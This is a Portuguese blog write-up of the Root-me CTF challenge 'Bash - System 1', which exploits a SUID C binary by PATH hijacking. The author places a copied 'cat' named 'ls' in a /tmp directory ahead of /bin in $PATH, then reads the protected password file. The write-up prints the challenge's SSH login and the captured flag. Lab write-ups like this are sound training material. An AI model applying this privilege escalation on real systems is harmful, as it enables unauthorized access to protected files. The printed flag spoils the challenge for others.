---
title: "Bash - Sistema 1 - root-me.org"
date: 2023-12-04
published: true
lang: pt-BR
translation_key: "bash-system-1-root-me"
original_url: /bash-system-1-root-me
permalink: /pt-br/bash-system-1-root-me
---
# [](#intro)Introdução

[Root-me](https://www.root-me.org) é um site CTF que tenta gamificar tópicos de aprendizagem, oferecendo diferentes tipos de desafios em muitas áreas diferentes em segurança cibernética. Este foi um dos meus primeiros contatos com CTFs, em dezembro de 2022. Como eu já tinha resolvido alguns dos desafios naquela época, eu decidi voltar para resolvê-los, e dar-lhes uma redação adequada desta vez (por que não?)

As categorias no site estão sob a guia de desafios. Neste post, estaremos resolvendo o Sistema Bash 1 da categoria App Script, o primeiro desafio. Vamos saltar para cima dele!

# [](#level-description)Challenge description

Diferentemente do Pwnable, os desafios da Root-me exibem uma "declaração" e "informações de conexão". O 'Declaração', geralmente composto do objetivo CTF, mostra um script para o qual precisamos explorar. O código fonte já está disponível mesmo antes do shing:

```c
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main(void)
    {
        setreuid(geteuid(), geteuid());
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
    }
```
Para nos conectarmos à sala, precisamos de SSH ou usar o WebSSH. Prefiro usar SSH da minha máquina local, embora o WebSSH deles também funcione. O comando para este desafio é:

`ssh -p 2222 app-script-ch11@challenge02.root-me.org`

e a senha é `app-script-ch11`.

# [](#approach)Aproxime-se da mentalidade

Embora este seja um site CTF diferente, vamos usar a mesma mentalidade de abordagem que temos usado até agora. Isso não só nos ajuda a manter um certo passo-a-passo organizado para resolver CTFs, mas também aumenta a probabilidade de aprender como se envolver em qualquer tipo de tópico relacionado ao hacking.

Neste CTF, a primeira coisa que podemos entender olhando para o código C acima é que provavelmente há um arquivo `.passwd` dentro do diretório `/challenge/app-script/ch11`. O código parece estar usando `system` para executar o comando `ls` no arquivo.

## [](#mindset-step1)Passo 1 - Compreendendo conceitos básicos

Quais são os conceitos básicos neste CTF? Bem, no nosso caso aqui, isso será simplesmente para investigar para que as funções usadas no script acima são. Para isso, precisamos fazer um pouco de pesquisa de programação C.

### Setreuid

De acordo com a página de manual do Linux, esta função requer dois argumentos inteiros não assinados: o id do usuário real e o id do usuário eficaz. Colocando em termos Linux simples, o 'real user id' é quem você realmente é dentro do sistema (aquele que possui o processo); enquanto o 'effective user id' é o que o sistema operacional olha para tomar uma decisão se você está ou não autorizado a fazer algo.

Aqui está uma quebra do que a função faz, de acordo com a [página de manual do Linux](https://man7.org/linux/man-pages/man2/setreuid.2.html):

> Processos desprivilegiados só podem definir o ID de usuário eficaz para o ID de usuário real, o ID de usuário eficaz ou o ID de usuário salvo.
>
> Usuários desprivilegiados só podem definir o ID de usuário real para o ID de usuário real ou o ID de usuário eficaz.
>
> Se o ID do usuário real for definido (ou seja, ruid não é -1) ou o ID do usuário efetivo for definido como um valor não igual ao ID do usuário real anterior, o ID do usuário real salvo será definido como o novo ID do usuário eficaz.

Os dois argumentos fornecidos pelo código são os mesmos: `geteuid()`. De acordo com a página de manual do Linux:

> geteuid() retorna o ID de usuário efetivo do processo de chamada.

Isso basicamente significa que quem possui o script C acima, o código irá executá-lo como proprietário (e seus privilégios).

Sistema

Esta função passa um nome de comando ou nome de programa especificado por uma string para o ambiente host. O processador de comando então executa o comando passado e retorna após ter sido concluído.

Ligando-se à função anterior: o código interpreta os privilégios do proprietário do script/binário e executa o comando com esses privilégios.

## [](#mindset-step2)Passo 2 - Compreender o problema

Agora que entendemos os conceitos básicos deste script CTF, estamos prontos para ampliar nossa visão relacionando-a com o CTF real. Vamos entrar na máquina e dar uma olhada ao redor usando o comando `ls -la`:

```bash
app-script-ch11@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5 14:00 ..
-r--------  1 root                    root             775 Dec 10  2021 ._perms
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
```
seguido por este comando:

```bash
app-script-ch11@challenge02:~$ whoami && groups app-script-ch11
app-script-ch11
app-script-ch11 : app-script-ch11 users
```
A saída desses comandos nos diz que fazemos parte do grupo da maioria dos arquivos, mas não somos o usuário `app-script-ch1-cracked`. Como consequência, não somos capazes de ler o conteúdo do `.passwd`, a menos que de alguma forma adquiramos os privilégios do usuário `app-script-ch11-cracked`.

Podemos, no entanto, executar o binário `ch11`, com uma possível exploração das funções `setreuid` e `system`. Note que o binário `ch11` tem o conjunto de bits SUID, o que significa que quando estiver em execução, ele irá assumir o arquivo do proprietário id de usuário eficaz.

O conjunto de bits SUID é uma permissão especial que se aplica a scripts ou aplicativos. Se o bit SUID estiver definido, o UID do script/aplicação eficaz torna-se o proprietário do arquivo, em vez do usuário executá-lo.

No entanto, isso só resulta em executar o comando `ls`, que é inútil neste caso. Idealmente, queremos que o comando dentro da função `system` seja `cat`.

A chave para resolver este problema é enganar o programa para pensar que ele executou o comando `ls`, mas na verdade executa o comando `cat`. Há algumas maneiras de tentarmos fazer isso, e é isso que vamos discutir a seguir.

## [](#mindset-step3)Passo 3 - Criando o ataque

Vamos tentar resolver o desafio aplicando o que aprendemos até agora e colocando em teste nossa suposição de enganar o programa para executar `cat` em vez de `ls`. Primeiro, vamos ver onde o comando `ls` está sendo executado:

```bash
app-script-ch11@challenge02:~$ which ls
/bin/ls
```
seguido pela variável $PATH:

```bash
app-script-ch11@challenge02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```
Está bem. Isso nos diz que o comando `ls` está sendo executado sob o caminho `/bin`. Mas e se tivéssemos outro comando `ls` referenciado em nossa variável $PATH? Se a ordem do nosso novo caminho de comando `ls` vem primeiro, então o caminho `/bin`, então o sistema irá priorizar esse caminho.

Duvido que tenhamos permissões de escrita em qualquer um desses caminhos, então podemos também encontrar um diretório que possamos escrever um comando `ls` malicioso e que este novo caminho seja adicionado à nossa variável $PATH, listado antes do caminho `/bin`.

Uma escolha usual para isso é o diretório `/tmp`, que geralmente dá permissões de escrita para qualquer usuário:

```bash
app-script-ch11@challenge02:~$ mkdir /tmp/cecil-daemon
app-script-ch11@challenge02:~$ cd /tmp/cecil-daemon && ls -la
total 0
drwxr-x---   2 app-script-ch11 app-script-ch11   40 Dec  5 01:17 .
drwxrwx-wt 256 root            root            7220 Dec  5 01:17 ..
```
Criamos com sucesso um diretório dentro do `/tmp` e, como podemos ver, temos permissões de escrita nele. Agora, queremos adicionar este novo diretório à nossa variável caminho:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ export PATH=/tmp/cecil-daemon:$PATH
app-script-ch11@challenge02:/tmp/cecil-daemon$ echo $PATH
/tmp/cecil-daemon:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```
Incrível! Nosso novo diretório `/tmp/cecil-daemon` está agora sob a variável $PATH, e está listado antes de `/bin`. Agora, precisamos criar um binário chamado `ls` que em vez de ter o comando `ls`, ele tem o comando `cat`. Vamos experimentar!

## [](#mindset-step4)Passo 4 - Resolvendo!

Precisamos verificar de onde o comando `cat` está sendo executado. Isto pode ser conseguido através da execução:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ which cat
/bin/cat
```
Minha primeira tentativa de criar um `ls` malicioso é simplesmente copiar o `cat` binário de `/bin` para `/tmp/cecil-daemon` sob o nome de `ls`. Isso deve forçar o `ls` a executar sempre o comando `cat`.

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ cp /bin/cat ./ls 
```
Como um teste, podemos executar o nosso malicioso `ls` para ler o conteúdo de um arquivo:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ echo "test" > test.txt
app-script-ch11@challenge02:/tmp/cecil-daemon$ ./ls test.txt
test
```
Parece estar a funcionar! Agora, vamos voltar para o nosso diretório home e executar o binário. Se tudo foi feito corretamente, poderemos ver o conteúdo do `.passwd`:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ cd - 
/challenge/app-script/ch11
app-script-ch11@challenge02:~$ ./ch11
!oPe96a/.s8d5
```
Conseguimos! Aproveite a sensação de possuir e enganar um sistema!

# [](#conclusions)Conclusão

Neste CTF, aprendemos um pouco mais sobre as configurações erradas do sistema e o mau uso das funções C. Começamos por entender os conceitos centrais usados pelo roteiro de desafio, então resolvemos o problema, entendendo como poderíamos explorá-lo.

Depois de compreendermos a natureza do CTF, precisávamos criar um vetor de ataque. No nosso caso, isso foi possível porque tivemos permissões de escrita no diretório `/tmp` e acesso para mudar a variável $PATH para nossos próprios ganhos. Ao combinar essas configurações erradas com um pouco de pensamento fora da caixa, criamos um comando malicioso `ls` que mimetizou o comando `cat` - aquele que queríamos usar.

É sempre uma boa prática entender o que está acontecendo antes de saltar para o teste. Esta abordagem facilita as coisas e muitas vezes clarifica a solução.

Obrigado por ficar até o fim. Espero que tenhas aprendido algo novo hoje! E lembre-se, sempre faça sua pesquisa **!

<a href="/">Voltar</a>
